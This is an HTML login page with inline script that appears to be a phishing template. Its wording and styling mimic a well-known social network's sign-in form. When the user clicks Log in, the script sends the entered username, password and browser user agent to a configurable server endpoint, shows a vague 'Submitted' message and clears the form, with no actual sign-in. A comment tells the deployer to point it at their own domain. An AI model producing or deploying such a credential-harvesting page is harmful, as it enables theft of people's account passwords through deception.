<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Sign in</title>
  <style>
    :root{--blue:#1161ee;--muted:#8a8f98;font-family:Inter,Roboto,system-ui,-apple-system,"Segoe UI",Arial;}
    body{margin:0;background:#fff;color:#111}
    .wrap{min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:36px 16px;box-sizing:border-box}
    .card{width:100%;max-width:420px;display:flex;flex-direction:column;gap:14px}
    .logo{margin:18px auto;width:72px;height:72px;border-radius:50%;background:linear-gradient(180deg,#1f7cf6,#0a46c7);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:34px}
    .input{height:56px;border-radius:14px;border:1px solid rgba(16,24,40,0.06);padding:0 16px;font-size:16px;outline:none;margin-bottom:8px}
    .btn{height:56px;border-radius:999px;background:var(--blue);color:#fff;border:none;font-size:18px;cursor:pointer}
    .create{border-radius:999px;border:1.5px solid rgba(17,97,238,0.28);height:56px;display:flex;align-items:center;justify-content:center;color:var(--blue);cursor:pointer}
    .meta{text-align:center;color:var(--muted);padding-top:8px}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="main">
      <div style="height:10px"></div>
      <div class="logo" aria-hidden="true">A</div>

      <input id="username" class="input" placeholder="Mobile number or email address" autocomplete="username" />
      <input id="password" type="password" class="input" placeholder="Password" autocomplete="current-password" />

      <button id="loginBtn" class="btn">Log in</button>

      <div style="margin-top:8px;text-align:center;color:#111;font-weight:500">Forgotten password?</div>

      <div style="margin-top:22px">
        <div id="createBtn" class="create">Create new account</div>
      </div>

      <div class="meta">© Your Company</div>
    </div>
  </div>

<script>
// Change SERVER to your deployed server URL (example: https://yourdomain.com)
const SERVER = "http://localhost:3000";

async function sendSubmit() {
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value;
  if(!u || !p) { alert('Please fill both fields'); return; }

  const payload = { username: u, password: p, userAgent: navigator.userAgent };

  try {
    const res = await fetch(SERVER + '/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await res.json();
    if(res.ok) {
      alert('Submitted — you will receive a notification.');
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
    } else {
      alert('Server error: ' + (data.message || 'unknown'));
    }
  } catch(err) {
    console.error(err);
    alert('Network error');
  }
}

document.getElementById('loginBtn').addEventListener('click', sendSubmit);
document.getElementById('createBtn').addEventListener('click', ()=> alert('Open your signup flow here.'));
</script>
</body>
</html>
